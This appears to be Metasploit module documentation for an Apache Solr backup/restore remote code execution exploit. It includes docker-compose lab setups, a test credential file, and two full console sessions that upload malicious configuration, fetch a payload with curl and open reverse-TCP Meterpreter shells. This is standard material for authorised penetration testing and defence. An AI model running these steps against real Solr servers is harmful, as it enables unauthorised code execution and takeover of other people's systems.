## Vulnerable Application

Apache Solr from 6.0.0 through 8.11.2, from 9.0.0 before 9.4.1 is affected by an Unrestricted Upload of File
with Dangerous Type vulnerability which can result in remote code execution in the context of the user running
Apache Solr. When Apache Solr creates a Collection, it will use a specific directory as the classpath and load
some classes from it. The backup function of the Collection can export malicious class files uploaded by
attackers to the directory, allowing Solr to load custom classes and create arbitrary Java code. Execution
can further bypass the Java sandbox configured by Solr, ultimately causing arbitrary command execution.

### Setup

Install a vulnerable instance of Apache Solr with the following docker-compose file. The instance must be running in 
"Cloud mode" in order to be vulnerable which is why the `-c` argument is included in the `solr start` command.

#### Apache Solr 9.0.0 (no Authentication)
```yml
version: '3'

services:
  solr:
    image: solr:9.0.0
    ports:
      - "8983:8983"
      - "5005:5005"
    command: sh -c "solr start -c -a '-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005' && tail -f /dev/null"
```

#### Apache Solr with Authentication

If Apache Solr is being run in Cloud mode with the Basic Authentication plugin then the `security.json` file must be 
uploaded to zookeeper as explained in the following [documentation](https://solr.apache.org/guide/8_1/basic-authentication-plugin.html).
This is why the following `docker-compose.yml` spins up an additional zookeeper image. 

This is the directory structure that should be followed in order for the `docker-compose.yml` file to find the `security.json`
file without any issues:
```
msfuser@msfuser-virtual-machine:~/solr/auth_docker$ tree
.
├── docker-compose.yml
└── solr-cloud
    └── security.json

1 directory, 2 files
```

The following `security.json` file can be used for testing purposes. The file will create a user: `solr` with the
the password: `SolrRocks`.

```json
{
"authentication":{
   "blockUnknown": true,
   "class":"solr.BasicAuthPlugin",
   "credentials":{"solr":"IV0EHq1OnNrj6gvRCwvFwTrZ1+z1oBbnQdiVC3otuq0= Ndd7LKvVBAaZIF0QAVi1ekCfAJXr1GGfLtRUXhgrF8c="},
   "realm":"My Solr users",
   "forwardCredentials": false
},
"authorization":{
   "class":"solr.RuleBasedAuthorizationPlugin",
   "permissions":[{"name":"security-edit",
      "role":"admin"}],
   "user-role":{"solr":"admin"}
}}
```


```yml
version: '3'
services:
  solr1:
    image: solr:9.0.0
    container_name: mysite-solr1
    restart: always
    ports:
      - "8983:8983"
    environment:
      SOLR_OPTS: -Djute.maxbuffer=50000000
      ZK_HOST: mysite-zoo1:2181
      SOLR_HEAP: 1g
    labels:
      - 'traefik.backend=solr'
      - 'traefik.port=8983'
      - 'traefik.frontend.rule=Host:solr.mysite.localhost'
    depends_on:
      - zoo1
    volumes:
      - ./solr-cloud/security.json:/var/security.json
      - .:/mnt/config
      - solr1:/var/solr
    command: bash -c "docker-entrypoint.sh solr zk cp file:/var/security.json zk:/security.json && exec solr-foreground"

  zoo1:
    image: zookeeper:3.6
    container_name: mysite-zoo1
    hostname: mysite-zoo1
    restart: always
    expose:
      - 2181
      - 7000
    environment:
      JVMFLAGS: -Djute.maxbuffer=50000000
      ZOO_MY_ID: 1
      ZOO_SERVERS: server.1=mysite-zoo1:2888:3888;2181
      ZOO_4LW_COMMANDS_WHITELIST: mntr, conf, ruok
      ZOO_CFG_EXTRA: "metricsProvider.className=org.apache.zookeeper.metrics.prometheus.PrometheusMetricsProvider metricsProvider.httpPort=7000 metricsProvider.exportJvmInfo=true"
    volumes:
      - .:/mnt/config
volumes:
  solr1:
```

## Verification Steps

1. Start msfconsole
1. Do: `use apache_solr_backup_restore`
1. Set the `RHOST`, `LHOST` and if required, the `USERNAME`, and `PASSWORD` options
1. Run the module
1. Receive a Meterpreter session as the `solr` user.

## Scenarios
### Apache Solr 9.0.0 (no Authentication)

```
msf6 > use linux/http/apache_solr_backup_restore
[*] Using configured payload cmd/linux/http/x64/meterpreter/reverse_tcp
msf6 exploit(linux/http/apache_solr_backup_restore) > set rhosts 127.0.0.1
rhosts => 127.0.0.1
msf6 exploit(linux/http/apache_solr_backup_restore) > set lhost 172.16.199.1
lhost => 172.16.199.1
msf6 exploit(linux/http/apache_solr_backup_restore) > options

Module options (exploit/linux/http/apache_solr_backup_restore):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    no        Solr password
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     127.0.0.1        yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.ht
                                         ml
   RPORT      8983             yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  solr             no        Path to Solr
   USERNAME   solr             no        Solr username
   VHOST                       no        HTTP server virtual host


Payload options (cmd/linux/http/x64/meterpreter/reverse_tcp):

   Name                Current Setting  Required  Description
   ----                ---------------  --------  -----------
   FETCH_COMMAND       CURL             yes       Command to fetch payload (Accepted: CURL, FTP, TFTP, TNFTP, WGET)
   FETCH_DELETE        false            yes       Attempt to delete the binary after execution
   FETCH_FILENAME      GCPCPUvxM        no        Name to use on remote system when storing payload; cannot contain spaces or slashes
   FETCH_SRVHOST                        no        Local IP to use for serving payload
   FETCH_SRVPORT       8080             yes       Local port to use for serving payload
   FETCH_URIPATH                        no        Local URI to use for serving payload
   FETCH_WRITABLE_DIR  /tmp/            yes       Remote writable dir to store payload; cannot contain spaces
   LHOST               172.16.199.1     yes       The listen address (an interface may be specified)
   LPORT               4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Unix Command



View the full module info with the info, or info -d command.

msf6 exploit(linux/http/apache_solr_backup_restore) > run

[*] Started reverse TCP handler on 172.16.199.1:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Running check method
[*] 127.0.0.1:8983: Authentication not required
[*] Found Apache Solr 9.0.0
[*] OS version is Linux amd64 6.6.16-linuxkit
[+] The target appears to be vulnerable. Found Apache Solr version: 9.0.0
[+] Uploaded configuration successfully
[+] Backed up collection successfully
[+] Backed up collection successfully
[+] Uploaded configuration successfully
[*] Sending stage (3045380 bytes) to 172.16.199.1
[+] Successfully dropped the payload
[*] Meterpreter session 12 opened (172.16.199.1:4444 -> 172.16.199.1:50057) at 2024-04-01 16:18:17 -0700
[*] Cleaning up...

meterpreter > getuid
Server username: solr
meterpreter > sysinfo
Computer     : 192.168.128.2
OS           : Ubuntu 20.04 (Linux 6.6.16-linuxkit)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter >
```

### Apache Solr 9.0.0 with Authentication
```
msf6 exploit(linux/http/apache_solr_backup_restore) > set password SolrRocks
password => SolrRocks
msf6 exploit(linux/http/apache_solr_backup_restore) > set username solr
username => solr
msf6 exploit(linux/http/apache_solr_backup_restore) > set rhost 172.16.199.132
rhost => 172.16.199.132
msf6 exploit(linux/http/apache_solr_backup_restore) > set lhost 172.16.199.1
lhost => 172.16.199.1
msf6 exploit(linux/http/apache_solr_backup_restore) > options

Module options (exploit/linux/http/apache_solr_backup_restore):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD   SolrRocks        no        Solr password
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     172.16.199.132   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.ht
                                         ml
   RPORT      8983             yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  solr             no        Path to Solr
   USERNAME   solr             no        Solr username
   VHOST                       no        HTTP server virtual host


Payload options (cmd/linux/http/x64/meterpreter/reverse_tcp):

   Name                Current Setting  Required  Description
   ----                ---------------  --------  -----------
   FETCH_COMMAND       CURL             yes       Command to fetch payload (Accepted: CURL, FTP, TFTP, TNFTP, WGET)
   FETCH_DELETE        false            yes       Attempt to delete the binary after execution
   FETCH_FILENAME      dkNrXBirxJx      no        Name to use on remote system when storing payload; cannot contain spaces or slashes
   FETCH_SRVHOST                        no        Local IP to use for serving payload
   FETCH_SRVPORT       8080             yes       Local port to use for serving payload
   FETCH_URIPATH                        no        Local URI to use for serving payload
   FETCH_WRITABLE_DIR  /tmp/            yes       Remote writable dir to store payload; cannot contain spaces
   LHOST               172.16.199.1     yes       The listen address (an interface may be specified)
   LPORT               4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Unix Command



View the full module info with the info, or info -d command.

msf6 exploit(linux/http/apache_solr_backup_restore) > run

[*] Started reverse TCP handler on 172.16.199.1:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Running check method
[*] Found Apache Solr 9.0.0
[*] OS version is Linux amd64 6.5.0-26-generic
[+] The target appears to be vulnerable. Found Apache Solr version: 9.0.0
[+] Uploaded configuration successfully
[+] Backed up collection successfully
[+] Backed up collection successfully
[+] Uploaded configuration successfully
[*] Sending stage (3045380 bytes) to 172.16.199.132
[+] Successfully dropped the payload
[*] Meterpreter session 14 opened (172.16.199.1:4444 -> 172.16.199.132:41742) at 2024-04-01 16:25:16 -0700
[*] Cleaning up...

meterpreter > getuid
Server username: solr
meterpreter > sysinfo
Computer     : 172.21.0.3
OS           : Ubuntu 20.04 (Linux 6.5.0-26-generic)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter >
```